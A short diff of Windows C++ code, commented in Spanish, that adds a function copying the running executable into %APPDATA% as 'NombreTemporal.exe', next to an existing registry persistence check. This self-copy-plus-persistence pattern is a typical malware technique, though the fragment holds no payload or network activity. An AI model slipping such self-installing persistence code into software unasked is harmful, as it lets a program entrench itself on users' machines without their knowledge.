@@ -67,3 +67,36 @@ bool checkPersistence(const std::wstring& valueName) {
 
     return (rc == ERROR_SUCCESS);
 }
+
+//Copiar ejecutable en %APPDATA%
+int copyexe() {
+    // 1) Obtener ruta del ejecutable actual
+    char exePath[MAX_PATH];                        // buffer para la ruta
+    DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    if (len == 0) {
+        std::cerr << "Error: no se pudo obtener la ruta del exe.\n";
+        return 1;
+    }
+
+    // 2) Obtener carpeta AppData desde la variable de entorno %APPDATA%
+    const char* appdata = std::getenv("APPDATA");
+    if (!appdata) {                               // si no existe la variable
+        std::cerr << "Error: APPDATA no encontrada.\n";
+        return 1;
+    }
+
+    // 3) Construir ruta destino (AppData\\NombreTemporal.exe)
+    std::string destino = std::string(appdata) + "\\NombreTemporal.exe";
+
+    // 4) Copiar el archivo (origen = exePath, destino = destino.c_str())
+    if (CopyFileA(exePath, destino.c_str(), FALSE)) {
+        std::cout << "Copiado correctamente a: " << destino << "\n";
+    }
+    else {
+        std::cerr << "Error al copiar (codigo): " << GetLastError() << "\n";
+        return 1;
+    }
+
+    return 0;
+}
+
